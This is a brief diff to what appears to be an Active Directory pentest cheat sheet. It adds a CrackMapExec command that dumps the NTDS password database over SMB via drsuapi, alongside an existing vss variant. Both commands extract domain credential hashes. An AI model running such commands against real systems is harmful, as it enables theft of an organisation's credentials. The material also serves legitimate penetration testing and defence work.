@@ -375,6 +375,7 @@ CrackMapExec module
 
 ```powershell
 cme smb 10.10.0.202 -u username -p password --ntds vss
+cme smb 10.10.0.202 -u username -p password --ntds drsuapi #default
 ```
 
 ### Password in AD User comment
